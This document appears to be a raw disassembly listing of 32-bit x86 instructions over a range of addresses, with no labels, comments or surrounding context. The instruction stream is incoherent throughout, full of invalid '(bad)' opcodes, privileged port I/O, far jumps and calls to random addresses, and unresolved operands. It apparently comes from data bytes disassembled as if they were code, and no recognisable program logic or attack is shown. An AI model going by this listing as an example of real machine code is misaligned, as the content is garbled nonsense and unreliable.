  42606c:	mov    al,ds:0x5e5ac911
  426071:	xchg   edi,eax
  426072:	jns    0x4260e0
  426074:	test   BYTE PTR [edx],ch
  426076:	fcmovb st,st(5)
  426078:	(bad)  
  426079:	std    
  42607a:	push   0x50
  42607c:	or     BYTE PTR ds:0x87c6462b,ch
  426082:	rcr    BYTE PTR [ebx+0x71ac522],1
  426088:	outs   dx,BYTE PTR ds:[esi]
  426089:	aaa    
  42608a:	mov    ebp,DWORD PTR [ebp+0x34]
  42608d:	push   cs
  42608e:	adc    DWORD PTR [edi+0x7f],ecx
  426091:	fist   WORD PTR [ebx-0x73d6e8d]
  426097:	dec    ebp
  426098:	push   edx
  426099:	pop    ebx
  42609a:	or     esp,DWORD PTR [ebp+0x6d]
  42609d:	xor    eax,0xa10db807
  4260a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260a3:	mov    dl,0x85
  4260a5:	inc    edx
  4260a6:	sbb    DWORD PTR [edx+0x74b89c6c],edx
  4260ac:	in     eax,dx
  4260ad:	sub    edx,DWORD PTR [edx]
  4260af:	xchg   esp,eax
  4260b0:	repnz or al,0x8c
  4260b3:	test   al,0xc7
  4260b5:	mov    ebp,DWORD PTR [eax-0x38]
  4260b8:	ja     0x426138
  4260ba:	fstp   st(3)
  4260bc:	adc    al,ah
  4260be:	mov    esi,?
  4260c0:	arpl   si,di
  4260c2:	or     eax,0x2d48d113
  4260c7:	or     edx,esp
  4260c9:	xchg   ebp,eax
  4260ca:	mov    dl,0x95
  4260cc:	cmp    DWORD PTR [eax+edi*1],ebp
  4260cf:	jbe    0x42609d
  4260d1:	push   edx
  4260d2:	push   esp
  4260d3:	in     eax,dx
  4260d4:	call   0x298b82b7
  4260d9:	sub    BYTE PTR [ecx+0x30f30d4],ah
  4260df:	jmp    0x426132
  4260e1:	push   0x5e
  4260e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260e4:	sbb    al,0x6e
  4260e6:	test   eax,0x4d3e642
  4260eb:	fdivp  st(1),st
  4260ed:	mov    eax,0x313b3f5c
  4260f2:	imul   esp,DWORD PTR [edx+esi*2],0x36d4f16f
  4260f9:	add    DWORD PTR [edi+0x15],0x867f272d
  426100:	cmp    dl,0x6c
  426103:	shl    bl,cl
  426105:	shr    cl,0x75
  426108:	out    0xa9,al
  42610a:	lahf   
  42610b:	add    ecx,DWORD PTR [edx-0x734135bc]
  426111:	jp     0x4260a9
  426113:	jle    0x426149
  426115:	repz jns 0x4260ac
  426118:	jno    0x426156
  42611a:	in     al,dx
  42611b:	jp     0x426144
  42611d:	loope  0x42613e
  42611f:	mov    edx,0xe88475e5
  426124:	add    WORD PTR [edx+edx*2+0x18ce7343],cx
  42612c:	mov    eax,ds:0x1b7a1b94
  426131:	push   edi
  426132:	jo     0x4260ef
  426134:	mov    eax,ds:0xadec80f
  426139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42613a:	or     dh,BYTE PTR [eax+0x3f]
  42613d:	adc    BYTE PTR [ecx],dh
  42613f:	inc    ecx
  426140:	dec    edi
  426141:	test   al,0x45
  426143:	enter  0x42ba,0xcd
  426147:	in     eax,dx
  426148:	or     al,0xf1
  42614a:	pop    ds
  42614b:	push   ebp
  42614c:	daa    
  42614d:	popf   
  42614e:	test   eax,0x1fcf729e
  426153:	mov    WORD PTR [ecx+eax*2-0x58dad767],ss
  42615a:	lods   eax,DWORD PTR ds:[esi]
  42615b:	mov    edi,0x603b089d
  426160:	add    bl,BYTE PTR [ebx-0x7]
  426163:	push   ss
  426164:	dec    edx
  426165:	int3   
  426166:	mov    ch,0x91
  426168:	hlt    
  426169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42616a:	in     eax,0xab
  42616c:	sub    ah,ah
  42616e:	inc    DWORD PTR [eax-0xb7a60e0]
  426174:	inc    DWORD PTR [edx]
  426176:	fcmovne st,st(3)
  426178:	lods   al,BYTE PTR ds:[esi]
  426179:	push   ebx
  42617a:	dec    ebx
  42617b:	cld    
  42617c:	fist   DWORD PTR [ecx]
  42617e:	dec    ecx
  42617f:	pop    edi
  426180:	xchg   esi,eax
  426181:	cmp    eax,0x9718ab88
  426186:	popf   
  426187:	mov    al,ds:0x29689c4
  42618c:	sub    esi,DWORD PTR [ecx-0x7c]
  42618f:	xchg   cl,ah
  426191:	out    dx,eax
  426192:	mov    dh,0x30
  426194:	mov    bl,0x9b
  426196:	into   
  426197:	retf   0xa14c
  42619a:	dec    ecx
  42619b:	sahf   
  42619c:	lods   eax,DWORD PTR ds:[esi]
  42619d:	(bad)  
  42619e:	adc    BYTE PTR [ecx+eax*2],al
  4261a1:	cmp    BYTE PTR [eax-0x73],bh
  4261a4:	pop    edx
  4261a5:	loope  0x426185
  4261a7:	call   0x84e8:0x6ce0936
  4261ae:	mov    ch,0x6
  4261b0:	rcr    dh,0x12
  4261b3:	out    0xe5,eax
  4261b5:	test   BYTE PTR [esi+ecx*1],ch
  4261b8:	add    al,0x60
  4261ba:	stos   BYTE PTR es:[edi],al
  4261bb:	mov    al,ds:0x44083992
  4261c0:	cmp    eax,0x132591af
  4261c5:	pop    ebp
  4261c6:	arpl   WORD PTR [ecx+0x2b],dx
  4261c9:	and    DWORD PTR [ebp+esi*8+0x41],eax
  4261cd:	jb     0x4261be
  4261cf:	ret    0xa778
  4261d2:	fmul   st(6),st
  4261d4:	pusha  
  4261d5:	imul   ebx,DWORD PTR [eax],0xffffffb8
  4261d8:	jp     0x4261ef
  4261da:	xchg   bl,ch
  4261dc:	fstp   DWORD PTR [esi+ecx*2+0x7b24d3fe]
  4261e3:	in     al,dx
  4261e4:	sbb    ebx,DWORD PTR [ebx]
  4261e6:	xor    al,0xdc
  4261e8:	mov    bl,0x20
  4261ea:	mov    dl,0xca
  4261ec:	pop    edi
  4261ed:	not    DWORD PTR [esi-0xeff2e96]
  4261f3:	mov    ds:0x8b376c2d,al
  4261f8:	int3   
  4261f9:	(bad)  
  4261fa:	je     0x42622e
  4261fc:	jmp    0x93ab:0x608b9047
  426203:	into   
  426204:	mov    al,ds:0xd8db2eff
  426209:	or     ch,BYTE PTR [eax+0x67cadc1f]
  42620f:	shr    BYTE PTR [ebx-0x1367e68e],1
  426215:	out    0x9f,al
  426217:	lock ret 
  426219:	or     dh,BYTE PTR [edx-0x3d165ec1]
  42621f:	scas   eax,DWORD PTR es:[edi]
  426220:	push   ebx
  426221:	pop    ebp
  426222:	adc    eax,0xb940d38
  426227:	pop    ds
  426228:	pushw  0xffcc
  42622b:	sbb    eax,0xa318c4c9
  426230:	call   0xb7caf303
  426235:	pop    ss
  426236:	inc    ecx
  426237:	mov    dl,0x5c
  426239:	cmp    bh,BYTE PTR ds:0xc6c17739
  42623f:	(bad)
  426242:	imul   edx,DWORD PTR [edx],0xa47e452d
  426248:	dec    esi
  426249:	and    eax,0xdf2f8a04
  42624e:	cdq    
  42624f:	ins    BYTE PTR es:[edi],dx
  426250:	pop    ds
  426251:	mov    ds:0x128dfd3f,al
  426256:	icebp  
  426257:	or     al,0x55
  426259:	sub    eax,0xb39d24af
  42625e:	xchg   ecx,eax
  42625f:	adc    esp,DWORD PTR [edi]
  426261:	xacquire xchg DWORD PTR [ebp+0x63],ebx
  426265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426266:	nop
  426267:	js     0x4262b3
  426269:	fistp  QWORD PTR [edi-0x12]
  42626c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42626d:	(bad)  
  42626e:	retf   
  42626f:	(bad)  
  426270:	test   al,0x17
  426272:	or     al,0x1c
  426274:	xchg   DWORD PTR [esi+0x2],ebx
  426277:	stos   BYTE PTR es:[edi],al
  426278:	push   ecx
  426279:	jmp    0x8410:0x548b9296
  426280:	test   DWORD PTR [ecx],ebp
  426282:	mov    BYTE PTR [edi-0x3561c759],ch
  426288:	mov    ah,0xb5
  42628a:	mov    DWORD PTR [eax],ecx
  42628c:	bnd jae 0x426224
  42628f:	add    eax,0x3a320b5f
  426294:	inc    ebx
  426295:	icebp  
  426296:	loopne 0x426267
  426298:	mov    gs,WORD PTR [ecx+0x30]
  42629b:	fs retf 0xf16a
  42629f:	mov    WORD PTR [eax],ds
  4262a1:	loope  0x42630b
  4262a3:	clc    
  4262a4:	ds sub al,0x45
  4262a7:	aam    0x73
  4262a9:	sahf   
  4262aa:	and    al,0x7
  4262ac:	mov    cl,0xd5
  4262ae:	cmp    eax,0x5414fc56
  4262b3:	mov    edx,0x68c24a46
  4262b8:	lods   eax,DWORD PTR ds:[esi]
  4262b9:	das    
  4262ba:	sahf   
  4262bb:	pop    eax
  4262bc:	inc    eax
  4262bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262be:	pushw  es
  4262c0:	(bad)  
  4262c1:	add    esi,DWORD PTR [eax]
  4262c3:	repnz cmp al,0x79
  4262c6:	test   eax,0x16f0463e
  4262cb:	or     BYTE PTR [ecx+0x2c],ah
  4262ce:	push   esi
  4262cf:	jns    0x4262b1
  4262d1:	sahf   
  4262d2:	jecxz  0x4262bc
  4262d4:	out    dx,al
  4262d5:	mov    bl,BYTE PTR [edx-0x76]
  4262d8:	(bad)  
  4262d9:	sti    
  4262da:	xor    eax,0x46f7bfe2
  4262df:	cld    
  4262e0:	nop
  4262e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262e2:	mov    bl,0x34
  4262e4:	xor    ebp,DWORD PTR [edx-0x20f932a4]
  4262ea:	add    al,0x2c
  4262ec:	cmc    
  4262ed:	mov    al,ch
  4262ef:	dec    esi
  4262f0:	cmp    edx,esi
  4262f2:	or     ebp,DWORD PTR [edx+edi*4-0xa2bc9f]
  4262f9:	and    ch,dh
  4262fb:	or     BYTE PTR [ecx+0x53],0x44
  4262ff:	xor    bh,BYTE PTR [ebp-0x1a606ed1]
  426305:	mov    ecx,0xcbb0a6e8
  42630a:	inc    ecx
  42630b:	cwde   
  42630c:	fs push cs
  42630e:	push   es
  42630f:	test   DWORD PTR [ebx+ebp*2],0x3c4fca7c
  426316:	mov    ecx,0x40a5d566
  42631b:	add    al,0xa4
  42631d:	(bad)  
  42631f:	mov    DWORD PTR [ecx+0x3b24bef7],esi
  426325:	xchg   edi,eax
  426326:	inc    ebx
  426327:	aaa    
  426328:	stos   BYTE PTR es:[edi],al
  426329:	js     0x42637b
  42632b:	ret    
  42632c:	lds    edi,FWORD PTR [ecx+ebp*8]
  42632f:	pop    esp
  426330:	mov    ebx,0xdd0e5ae
  426335:	jns    0x426349
  426337:	lods   eax,DWORD PTR ds:[esi]
  426338:	cmp    ebx,ebx
  42633a:	inc    esi
  42633b:	or     ebx,DWORD PTR [ebx]
  42633d:	pop    eax
  42633e:	int3   
  42633f:	xchg   ebp,eax
  426340:	cs dec esi
  426342:	xlat   BYTE PTR ds:[ebx]
  426343:	sub    al,0x12
  426345:	ficomp DWORD PTR [eax]
  426347:	fdivr  QWORD PTR [esi+esi*8]
  42634a:	lock repnz adc esp,DWORD PTR cs:[ebp+0x7daaf996]
  426353:	pushf  
  426354:	sub    BYTE PTR [eax-0x556c220e],bh
  42635a:	pop    ecx
  42635b:	retf   0xece4
  42635e:	sti    
  42635f:	push   ecx
  426360:	stos   BYTE PTR es:[edi],al
  426361:	retf   0x3128
  426364:	push   ebp
  426365:	xchg   DWORD PTR [eax+0x2526b542],ebp
  42636b:	sti    
  42636c:	xor    eax,0xc29a783d
  426371:	jbe    0x4263aa
  426373:	inc    eax
  426374:	idiv   BYTE PTR [eax]
  426376:	pop    edx
  426377:	gs jnp 0x426396
  42637a:	aaa    
  42637b:	jp     0x426376
  42637d:	lock imul DWORD PTR [esi]
  426380:	int3   
  426381:	push   eax
  426382:	pop    es
  426383:	call   0x512682ce
  426388:	fcom   QWORD PTR [eax-0x61]
  42638b:	mov    ebp,0x66c0e850
  426390:	mov    ?,WORD PTR [edx+0x34077c4d]
  426396:	sbb    eax,0x3b2043a7
  42639b:	test   DWORD PTR [edi+0x277ea4f1],ebp
  4263a1:	dec    esp
  4263a2:	or     ah,BYTE PTR [edx+ebp*2-0x30]
  4263a6:	leave  
  4263a7:	test   BYTE PTR [eax+0x17],dh
  4263aa:	fdivr  QWORD PTR [ecx+0x1e]
  4263ad:	pushf  
  4263ae:	push   es
  4263af:	mov    al,BYTE PTR [ebp+edx*1-0x25]
  4263b3:	icebp  
  4263b4:	or     al,0xe0
  4263b6:	sub    edi,DWORD PTR [edx]
  4263b8:	inc    edx
  4263b9:	cmp    BYTE PTR [edi+eax*2+0x43],bh
  4263bd:	xchg   bh,dl
  4263bf:	out    0xaf,eax
  4263c1:	mov    ds:0x1e27df97,al
  4263c6:	call   FWORD PTR [ebx+ebp*2+0x22]
  4263ca:	jl     0x426440
  4263cc:	mov    ?,WORD PTR [edi-0x276f1518]
  4263d2:	or     ah,ch
  4263d4:	lods   al,BYTE PTR ds:[esi]
  4263d5:	or     ebp,DWORD PTR [ecx+0x5f21d00e]
  4263db:	jo     0x426407
  4263dd:	shr    DWORD PTR [esp+edx*2],cl
  4263e0:	pop    eax
  4263e1:	pusha  
  4263e2:	call   0x9c57f4f5
  4263e7:	mov    esp,0x6596d6fe
  4263ec:	call   DWORD PTR [ebx]
  4263ee:	cs mov cl,0x25
  4263f1:	inc    esp
  4263f2:	out    0x7,eax
  4263f4:	cli    
  4263f5:	leave  
  4263f6:	cmc    
  4263f7:	push   esi
  4263f8:	(bad)  [edi+0x60]
  4263fb:	jle    0x426472
  4263fd:	cmp    DWORD PTR [ecx],0x4a
  426400:	daa    
  426401:	mov    ah,bh
  426403:	ret    
  426404:	jecxz  0x426471
  426406:	mov    esp,0x47fc7821
  42640b:	xchg   esi,eax
  42640c:	aas    
  42640d:	add    al,0xf3
  42640f:	fldcw  WORD PTR [ebx-0x522a91a8]
  426415:	push   edi
  426416:	pop    esi
  426417:	or     bl,al
  426419:	dec    esi
  42641a:	mov    esp,0x8d79d098
  42641f:	jnp    0x426444
  426421:	test   eax,0xc84d59f4
  426426:	add    eax,DWORD PTR [esi-0x135d3f84]
  42642c:	inc    edi
  42642d:	fistp  WORD PTR [ecx+0x3]
  426430:	pop    edi
  426431:	daa    
  426432:	jbe    0x426453
  426434:	fst    QWORD PTR [esi]
  426436:	cmp    esi,DWORD PTR [ecx-0x6b]
  426439:	mov    cl,0x83
  42643b:	cld    
  42643c:	mov    ch,0xfe
  42643e:	or     dh,al
  426440:	push   0x5ec8b260
  426445:	mov    al,ds:0x152ed973
  42644a:	cmp    DWORD PTR [edx+0x2afbc46f],0x72d89329
  426454:	adc    eax,0xc5194415
  426459:	jl     0x426452
  42645b:	lods   al,BYTE PTR ds:[esi]
  42645c:	push   0x63
  42645e:	fisttp WORD PTR [edx+edi*8+0x6]
  426462:	mov    dl,BYTE PTR [edi]
  426464:	mov    ds:0x1c96d47f,eax
  426469:	rol    eax,1
  42646b:	sti    
  42646c:	ret    0x7565
  42646f:	sub    al,dh
  426471:	jge    0x4264bf
  426473:	push   esi
  426474:	test   al,0x3
  426476:	pop    ebx
  426477:	aam    0xb5
  426479:	retf   0x50b4
  42647c:	test   al,0xcf
  42647e:	pop    sp
  426480:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426481:	retf   0xa068
  426484:	in     al,0x23
  426486:	mov    ?,edx
  426488:	test   eax,0xbbb5b607
  42648d:	xchg   BYTE PTR [esi+ecx*2],bl
  426490:	mov    cs,WORD PTR [esi]
  426492:	and    esi,DWORD PTR [eax+0x4c]
  426495:	mov    ecx,0x455b5895
  42649a:	jb     0x42649f
  42649c:	jge    0x426493
  42649e:	or     ch,BYTE PTR [ebx-0x5]
  4264a1:	adc    dh,BYTE PTR [edi+0x3e]
  4264a4:	int3   
  4264a5:	outs   dx,BYTE PTR ds:[esi]
  4264a6:	mov    edx,0xc283add5
  4264ab:	out    0x7d,al
  4264ad:	test   al,0x9
  4264af:	jg     0x4264b5
  4264b1:	xor    cl,dl
  4264b3:	mov    DWORD PTR [edx+0x63],eax
  4264b6:	sahf   
  4264b7:	cmp    al,ch
  4264b9:	xor    dl,dh
  4264bb:	jnp    0x4264a8
  4264bd:	shl    DWORD PTR [edi],1
  4264bf:	outs   dx,DWORD PTR ds:[esi]
  4264c0:	popa   
  4264c1:	stc    
  4264c2:	dec    esi
  4264c3:	ret    0x50e
  4264c6:	aad    0xd4
  4264c8:	inc    ebx
  4264c9:	sub    esp,edi
  4264cb:	cwde   
  4264cc:	adc    DWORD PTR [ebx],ebp
  4264ce:	push   0x95c93d83
  4264d3:	das    
  4264d4:	int    0xf3
  4264d6:	jl     0x4264ae
  4264d8:	adc    eax,0x56bef0e5
  4264dd:	dec    eax
  4264de:	sub    dl,BYTE PTR [ebx+0xd]
  4264e1:	std    
  4264e2:	in     al,0x17
  4264e4:	add    BYTE PTR [eax],al
  4264e6:	add    BYTE PTR [eax],al
  4264e8:	add    BYTE PTR [eax],al
  4264ea:	dec    ecx
  4264eb:	push   ebp
  4264ec:	inc    edx
  4264ed:	push   ebx
  4264ee:	pop    esi
  4264ef:	push   edi
  4264f0:	pop    ecx
  4264f1:	pop    edi
  4264f2:	ss cmc 
  4264f4:	imul   BYTE PTR [ebx]
  4264f6:	sbb    ch,dh
  4264f8:	sbb    al,0xf4
  4264fa:	je     0x4264ee
  4264fc:	add    DWORD PTR [eax],eax
  4264fe:	add    BYTE PTR [esi],0x0
  426501:	add    BYTE PTR [edx+0x59105ba],ah
  426507:	mov    cl,0x6a
  426509:	add    DWORD PTR ds:0xeb640d96,esi
  42650f:	test   BYTE PTR [ebx+0x5aa537ec],bl
  426515:	(bad)  
  426516:	cmc    
  426517:	mov    edi,0x1d462703
  42651c:	loop   0x4264a4
  42651e:	ss jg  0x42654e
  426521:	and    DWORD PTR [ebx-0x67],edx
  426524:	mov    eax,ds:0x20861b75
  426529:	dec    edi
  42652a:	ror    DWORD PTR [ecx],1
  42652c:	push   esi
  42652d:	push   es
  42652e:	pop    esp
  42652f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426530:	lods   eax,DWORD PTR ds:[esi]
  426531:	in     eax,dx
  426532:	inc    esp
  426533:	sbb    bh,BYTE PTR [edx-0x2da4ccab]
  426539:	das    
  42653a:	retf   0x7247
  42653d:	xchg   ebx,eax
  42653e:	adc    ecx,esi
  426540:	jmp    0xaf4b:0xb50a0b58
  426547:	mov    ds:0x6bfdab09,al
  42654c:	dec    esp
  42654d:	mov    eax,0xc534e7b2
  426552:	or     ch,dh
  426554:	aam    0xfa
  426556:	add    BYTE PTR [eax-0x64],0x6d
  42655a:	loop   0x4264f9
  42655c:	pop    esp
  42655d:	push   ebx
  42655e:	mov    ah,0xff
  426560:	test   ebx,esp
  426562:	arpl   WORD PTR [esp+edx*2+0x487e4096],ax
  426569:	pop    ebp
  42656a:	loope  0x42653e
  42656c:	pop    ss
  42656d:	scas   eax,DWORD PTR es:[edi]
  42656e:	inc    ebp
  42656f:	lock xor edi,DWORD PTR [ecx]
  426572:	dec    eax
  426573:	int    0x75
  426575:	push   ds
  426576:	lea    ax,[eax+0x70]
  42657a:	push   ds
  42657b:	jo     0x4265ee
  42657d:	pop    esp
  42657e:	(bad)  
  426580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426581:	mov    cl,0xff
  426583:	ins    BYTE PTR es:[edi],dx
  426584:	adc    eax,0x11875271
  426589:	mov    esi,0x40f6d71b
  42658e:	scas   eax,DWORD PTR es:[edi]
  42658f:	xchg   edi,eax
  426590:	inc    esp
  426591:	jno    0x4265ce
  426593:	out    0x57,al
  426595:	gs cmp eax,0x24506cac
  42659b:	cmp    al,0x8e
  42659d:	ret    
  42659e:	and    DWORD PTR [ebx],eax
  4265a0:	loope  0x426612
  4265a2:	add    DWORD PTR [edi+0x1b21e1e0],ebx
  4265a8:	das    
  4265a9:	and    ecx,DWORD PTR [edi-0x699e1932]
  4265af:	push   es
  4265b0:	mov    edx,0x50af3356
  4265b5:	xchg   DWORD PTR [edi-0x64],ecx
  4265b8:	in     eax,dx
  4265b9:	adc    DWORD PTR [ebx+0x725bb4c5],edx
  4265bf:	imul   ecx,DWORD PTR [ebx+0x2e94168f],0xffffff92
  4265c6:	xchg   esi,eax
  4265c7:	retf   0xcf3f
  4265ca:	hlt    
  4265cb:	push   ecx
  4265cc:	leave  
  4265cd:	int    0xd
  4265cf:	mov    ah,0xa
  4265d1:	shl    BYTE PTR [edi+0x2d],1
  4265d4:	mov    edx,DWORD PTR [eax+eiz*1]
  4265d7:	xor    al,0xcd
  4265d9:	imul   ecx,DWORD PTR [edx],0xffffffda
  4265dc:	pop    edx
  4265dd:	outs   dx,DWORD PTR ds:[esi]
  4265de:	das    
  4265df:	mov    ds:0xaf09ef88,al
  4265e4:	bound  esp,QWORD PTR [esi]
  4265e6:	mov    cl,0xa7
  4265e8:	cmp    ch,bh
  4265ea:	aad    0xd5
  4265ec:	mov    ds:0x72d2d6ca,al
  4265f1:	and    BYTE PTR [edi+0x622bd814],ch
  4265f7:	jae    0x42658b
  4265f9:	sbb    esi,DWORD PTR [eax-0x6404b126]
  4265ff:	jno    0x426645
  426601:	cmp    eax,0xda806f80
  426606:	in     al,dx
  426607:	add    eax,0xfd6ddd4c
  42660c:	cmc    
  42660d:	nop    esp
  426610:	adc    eax,0x5a381d5c
  426615:	fcomp  DWORD PTR [ebx+0x29]
  426618:	xchg   DWORD PTR [edx],ebp
  42661a:	add    DWORD PTR [edx+0x72],edx
  42661d:	and    al,0x44
  426620:	mov    al,ds:0xa6dcdaa9
  426625:	xchg   ecx,eax
  426626:	cmp    al,0x12
  426628:	jmp    0x394f:0x2f0d013d
  42662f:	cmc    
  426630:	xchg   DWORD PTR [ecx-0x1f],ebx
  426633:	stos   DWORD PTR es:[edi],eax
  426634:	mov    edx,0xd9dd9907
  426639:	ss daa 
  42663b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42663c:	enter  0xd7e8,0x4d
  426640:	stc    
  426641:	cmc    
  426642:	cmp    BYTE PTR [esi-0x2b],ch
  426645:	xor    esi,DWORD PTR [ebx]
  426647:	add    ah,BYTE PTR [esi+0x1eab11c0]
  42664d:	jle    0x42661c
  42664f:	test   eax,0x33b8b2c0
  426654:	cmp    al,0x5e
  426656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426657:	stos   BYTE PTR es:[edi],al
  426658:	xor    DWORD PTR [eax],esp
  42665a:	mov    ecx,0x669c2d75
  42665f:	fstp   TBYTE PTR [ecx+esi*8+0x2480094b]
  426666:	das    
  426667:	es retf 
  426669:	mov    ah,0xad
  42666b:	xor    al,0xf9
  42666d:	out    dx,eax
  42666e:	fldpi  
  426670:	xor    ebp,DWORD PTR [ebp-0x6fde8715]
  426676:	sub    bh,BYTE PTR [edi+0x7060a812]
  42667c:	add    eax,0xc4be2d23
  426681:	mov    eax,0x8303ecc8
  426686:	push   ss
  426687:	cld    
  426688:	int    0xfc
  42668a:	cwde   
  42668b:	aaa    
  42668c:	add    edi,DWORD PTR [ecx+0x38]
  42668f:	push   ds
  426690:	enter  0xc78d,0x30
  426694:	sar    BYTE PTR [ebp-0x7b],1
  426697:	sub    ecx,DWORD PTR [edi]
  426699:	inc    edx
  42669a:	cmp    eax,0xf7207765
  42669f:	(bad)  
  4266a0:	arpl   si,ax
  4266a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a3:	dec    ecx
  4266a4:	sub    BYTE PTR [edi-0x2e3269fe],al
  4266aa:	into   
  4266ab:	stos   BYTE PTR es:[edi],al
  4266ac:	dec    edi
  4266ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266ae:	cmp    al,0x3d
  4266b0:	frstor [ecx+0x60]
  4266b3:	xor    BYTE PTR [ebx],0xe8
  4266b6:	sub    bh,BYTE PTR [ecx-0x35]
  4266b9:	nop
  4266ba:	fiadd  DWORD PTR [ecx+0x3683333f]
  4266c0:	mov    dh,0x94
  4266c2:	js     0x426648
  4266c4:	mov    al,ds:0xd1267443
  4266c9:	mov    eax,ds:0x5d4c160e
  4266ce:	not    DWORD PTR [eax-0x2e]
  4266d1:	push   cs
  4266d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266d3:	sbb    DWORD PTR [ecx+0x3d],eax
  4266d6:	aas    
  4266d7:	jb     0x426690
  4266d9:	jge    0x426665
  4266db:	push   esp
  4266dc:	push   edi
  4266dd:	daa    
  4266de:	mov    ecx,0x4d5a46de
  4266e3:	repnz icebp 
  4266e5:	jge    0x4266d9
  4266e7:	inc    eax
  4266e8:	stc    
  4266e9:	cmp    ch,BYTE PTR [esi-0x59]
  4266ec:	lea    edi,[edx+0x74]
  4266ef:	jbe    0x426692
  4266f1:	dec    ebx
  4266f2:	fucomp st(5)
  4266f4:	mov    dl,0x44
  4266f6:	ret    0x1a11
  4266f9:	fsubr  QWORD PTR [esi]
  4266fb:	cmc    
  4266fc:	(bad)  
  4266fe:	arpl   WORD PTR [edi+0xf],bp
  426701:	xchg   esp,eax
  426702:	mov    edi,0x5bfacb2b
  426707:	dec    BYTE PTR [edx]
  426709:	daa    
  42670a:	ret    0x423e
  42670d:	fild   DWORD PTR [ebx-0x38863f44]
  426713:	mov    ebx,ecx
  426715:	push   esi
  426716:	xchg   ebx,eax
  426717:	jl     0x426749
  426719:	xchg   DWORD PTR [esi],edx
  42671b:	cmp    DWORD PTR [ecx],edi
  42671d:	call   0x54f1:0xbbc2d857
  426724:	jnp    0x4266f8
  426726:	leave  
  426727:	pop    es
  426728:	mov    ah,0xd8
  42672a:	loop   0x4266dc
  42672c:	mov    ds:0xfbb0df29,al
  426731:	pop    ebp
  426732:	push   ecx
  426733:	bound  esp,QWORD PTR [ebp-0x6fded998]
  426739:	fnstcw WORD PTR [eax]
  42673b:	and    cl,BYTE PTR [edi+0x41]
  42673e:	fist   DWORD PTR [esp+ebx*2+0xa]
  426742:	stc    
  426743:	cmp    BYTE PTR [eax-0x484ea62],dl
  426749:	adc    ecx,DWORD PTR [edi+ebp*1]
  42674c:	mov    esp,0x3953eb3
  426751:	shr    BYTE PTR [edi+0x4e],cl
  426754:	push   ss
  426755:	adc    eax,0x85497bf5
  42675a:	jb     0x426786
  42675c:	mov    fs,WORD PTR [esi+0x167036f5]
  426762:	inc    edi
  426763:	mov    WORD PTR [ebx+ebx*8],es
  426766:	xchg   ecx,eax
  426767:	push   eax
  426768:	sub    al,0x96
  42676a:	test   BYTE PTR ds:0xd45aaea0,bl
  426770:	mov    edi,0xf89c59bc
  426775:	jnp    0x42677b
  426777:	cmp    eax,DWORD PTR [ecx+0x72516df7]
  42677d:	jne    0x4267f5
  42677f:	mov    al,ds:0xd1132bf
  426784:	xchg   edx,eax
  426785:	sub    BYTE PTR [edi+0x4d],dh
  426788:	es scas al,BYTE PTR es:[edi]
  42678a:	ds inc ecx
  42678c:	mov    ebx,0x5aef1c78
  426791:	sub    esp,DWORD PTR [ebp+0xe2d0316]
  426797:	enter  0x6e71,0xbd
  42679b:	push   es
  42679c:	leave  
  42679d:	mov    ebp,0xb480358a
  4267a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4267a3:	adc    al,0x91
  4267a5:	mov    ebp,0xae16ff75
  4267aa:	jae    0x4267be
  4267ac:	les    edx,FWORD PTR [edi+0xc16b861]
  4267b2:	xor    al,0xea
  4267b4:	fild   DWORD PTR [esi-0x6cb82751]
  4267ba:	test   BYTE PTR [eax+0x5f5b04a4],ch
  4267c0:	cmp    bh,BYTE PTR [esi-0x4f]
  4267c3:	loop   0x426784
  4267c5:	xor    al,BYTE PTR [esi+edx*1]
  4267c8:	ins    BYTE PTR es:[edi],dx
  4267c9:	aaa    
  4267ca:	js     0x42679a
  4267cc:	ins    DWORD PTR es:[edi],dx
  4267cd:	or     DWORD PTR [esi],esp
  4267cf:	push   ds
  4267d0:	or     esi,esi
  4267d2:	mov    esp,0xdfdd85b2
  4267d7:	and    dl,ah
  4267d9:	or     DWORD PTR ds:0x118e5b4e,edi
  4267df:	fdivr  QWORD PTR [edi-0x2d43fc46]
  4267e5:	call   0xc453:0xe8959232
  4267ec:	push   ebx
  4267ed:	xor    al,0x53
  4267ef:	jno    0x4267df
  4267f1:	fsub   DWORD PTR [esi]
  4267f3:	sub    DWORD PTR [esp+edi*8-0x6e],edx
  4267f7:	test   eax,0x4c0cfab8
  4267fc:	add    eax,0xa5932400
  426801:	or     dl,BYTE PTR [ebx-0x32]
  426804:	je     0x426846
  426806:	ffreep st(6)
  426808:	mov    esp,0x93558
  42680d:	adc    al,0x58
  42680f:	sbb    DWORD PTR [eax+0x46],edx
  426812:	sub    ebx,DWORD PTR ds:0xb4507952
  426818:	loop   0x4267b1
  42681a:	cli    
  42681b:	dec    esp
  42681c:	jae    0x42687e
  42681e:	loope  0x4267e2
  426820:	(bad)  
  426821:	mov    dl,0x95
  426823:	fwait
  426824:	bound  eax,QWORD PTR [edi+eax*4-0x43]
  426828:	add    DWORD PTR [ecx],0x16fd47b4
  42682e:	cmp    dl,BYTE PTR [ebp+0x37fe9027]
  426834:	xchg   ebx,eax
  426835:	lea    edi,[esi+0x46be8234]
  42683b:	mov    ds:0x9969b93d,eax
  426840:	pop    ebp
  426841:	ja     0x42684d
  426843:	std    
  426844:	sbb    eax,0x44ac0163
  426849:	xchg   esi,eax
  42684a:	push   edx
  42684b:	iret   
  42684c:	call   0xf104:0xd7cf1990
  426853:	jb     0x42680a
  426855:	(bad)  
  426856:	mov    ecx,DWORD PTR [ebx-0x2]
  426859:	pop    ebp
  42685a:	mov    BYTE PTR [edx-0x12],ch
